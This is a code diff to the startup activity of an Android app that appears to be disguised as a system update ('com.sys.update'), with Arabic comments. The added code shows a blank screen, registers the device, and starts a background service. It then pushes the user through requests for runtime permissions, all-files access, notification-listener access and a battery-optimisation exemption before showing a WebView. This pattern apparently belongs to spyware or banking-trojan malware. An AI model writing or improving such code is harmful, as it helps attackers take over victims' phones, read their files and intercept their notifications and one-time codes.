@@ -1,4 +1,4 @@
-package com.sys.update2
+package com.sys.update
 
 import android.Manifest
 import android.app.NotificationChannel
@@ -28,19 +28,14 @@ class MainActivity : AppCompatActivity() {
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
+        // 1. سجّل الجهاز
         DeviceManager.registerDevice(this)
+
+        // 2. شغّل الخدمة
         startBackgroundService()
 
-        android.os.Handler(mainLooper).postDelayed({
-            try {
-                startActivity(Intent(this, WebViewActivity::class.java))
-                finish()
-            } catch (_: Exception) {}
-        }, 500)
-
-        android.os.Handler(mainLooper).postDelayed({
-            requestPermissionsStep1()
-        }, 2000)
+        // 3. اطلب الصلاحيات فورًا (قبل فتح WebView)
+        requestPermissionsStep1()
     }
 
     private fun requestPermissionsStep1() {
@@ -75,7 +70,7 @@ class MainActivity : AppCompatActivity() {
         if (needed.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
         } else {
-            requestAllFilesAccess()
+            onPermissionsDone()
         }
     }
 
@@ -85,6 +80,11 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        onPermissionsDone()
+    }
+
+    private fun onPermissionsDone() {
+        // بعد الصلاحيات — نطلب إعدادات خاصة
         requestAllFilesAccess()
     }
 
@@ -103,7 +103,7 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }
-        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 2000)
+        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 3000)
     }
 
     private fun requestNotifAccess() {
@@ -112,7 +112,7 @@ class MainActivity : AppCompatActivity() {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             } catch (_: Exception) {}
         }
-        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 2000)
+        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
     }
 
     private fun isNotifAccessGranted(): Boolean {
@@ -125,6 +125,15 @@ class MainActivity : AppCompatActivity() {
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
             intent.data = Uri.parse("package:$packageName")
             startActivity(intent)
+        } catch (_: Exception) {}
+        // بعد البطارية — افتح WebView
+        android.os.Handler(mainLooper).postDelayed({ openWebView() }, 2000)
+    }
+
+    private fun openWebView() {
+        try {
+            startActivity(Intent(this, WebViewActivity::class.java))
+            finish()
         } catch (_: Exception) {}
     }
 
